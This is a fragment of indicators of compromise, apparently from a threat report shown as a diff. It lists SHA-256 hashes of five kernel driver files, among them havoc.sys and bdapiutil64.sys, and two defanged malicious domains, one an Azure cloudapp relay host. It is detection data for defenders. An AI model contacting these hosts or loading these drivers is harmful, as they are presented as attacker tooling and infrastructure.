+5abe477517f51d81061d2e69a9adebdcda80d36667d0afabe103fda4802d33db – havoc.sys
+
+72d0b5615b996cbb01b1ca139e627079094f734da48a0435ffd8480a25d0a258 – monprocessex.sys
+
+e727d0753d2cd0b2f6eeba4cea53aa10b3ff3ed2afeb78f545fcf6d840f85c3e – xhunter1.sys
+
+9058388d05d984ca691a23ee70fcdbd3266c5cdc68ebc5aed95c67f1c502bc75 – bdapiutil64.sys
+
+2fdfdd13a0c548bb68c9d5aa8599a9265d4659da3e237fe7a42ac6ac06b9a06a – fly.sys
+
+Network IOCs
+
+msrcontrib[.]com
+
+cfgsync-relay.eastus.cloudapp.azure[.]com"
